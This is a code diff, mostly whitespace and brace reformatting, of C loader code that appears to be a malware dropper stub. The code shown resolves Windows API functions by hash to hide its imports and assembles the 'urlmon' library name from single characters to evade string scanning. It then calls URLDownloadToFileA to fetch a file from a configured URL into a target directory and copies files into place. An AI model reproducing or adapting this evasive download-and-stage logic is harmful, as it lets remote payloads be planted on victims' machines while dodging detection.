@@ -8,7 +8,7 @@ struct {
     int len;
     int offset;
     char file[_MAX_PATH];
-	char targetDir[_MAX_PATH];
+    char targetDir[_MAX_PATH];
     char downloadUrl[_MAX_PATH];
 } sc = { "Hello, World!" };
 
@@ -233,7 +233,8 @@ void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAdd
     return 0;
 }
 
-char* strstr(const char* h, const char* n) {
+char* strstr(const char* h, const char* n)
+{
     if (!*n) return (char*)h;
     for (; *h; h++) {
         const char* p = h, * q = n;
@@ -261,8 +262,8 @@ int entry()
     _CreateFileA CreateFileA = (_CreateFileA)get_proc_address_from_hash(kernel32, CreateFileA_Hash, GetProcAddress);
     _SetFilePointer SetFilePointer = (_SetFilePointer)get_proc_address_from_hash(kernel32, SetFilePointer_Hash, GetProcAddress);
     _ReadFile ReadFile = (_ReadFile)get_proc_address_from_hash(kernel32, ReadFile_Hash, GetProcAddress);
-	_DeleteFileA DeleteFileA = (_DeleteFileA)get_proc_address_from_hash(kernel32, DeleteFileA_Hash, GetProcAddress);
-	_CopyFileA CopyFileA = (_CopyFileA)get_proc_address_from_hash(kernel32, CopyFileA_Hash, GetProcAddress);
+    _DeleteFileA DeleteFileA = (_DeleteFileA)get_proc_address_from_hash(kernel32, DeleteFileA_Hash, GetProcAddress);
+    _CopyFileA CopyFileA = (_CopyFileA)get_proc_address_from_hash(kernel32, CopyFileA_Hash, GetProcAddress);
     _CloseHandle CloseHandle = (_CloseHandle)get_proc_address_from_hash(kernel32, CloseHandle_Hash, GetProcAddress);
     _IsFileExist IsFileExist = (_IsFileExist)get_proc_address_from_hash(kernel32, IsFileExist_Hash, GetProcAddress);
 
@@ -271,14 +272,16 @@ int entry()
     if (sc.targetDir[0]) {
         char curExe[MAX_PATH], * p = dstFile, * dir = sc.targetDir;
         GetModulePath(NULL, curExe, MAX_PATH);
-        while (*dir) *p++ = *dir++; *p++ = '\\';
-        while (*file) *p++ = *file++; *p = '\0';
+        while (*dir) *p++ = *dir++;
+        *p++ = '\\';
+        while (*file) *p++ = *file++;
+        *p = '\0';
         char name[] = { 'u','r','l','m','o','n','\0' };
         HMODULE urlmon = LoadLibraryA(name);
         _Download URLDownloadToFileA = urlmon ? (_Download)get_proc_address_from_hash(urlmon, Download_Hash, GetProcAddress) : NULL;
         if (sc.downloadUrl[0] && IsFileExist(dstFile) == INVALID_FILE_ATTRIBUTES && URLDownloadToFileA) {
             if (FAILED(URLDownloadToFileA(NULL, sc.downloadUrl, dstFile, 0, NULL))) return(-1);
-        } 
+        }
         file = dstFile;
         if (!strstr(curExe, sc.targetDir)) {
             BOOL b = CopyFileA(sc.file, dstFile, FALSE);
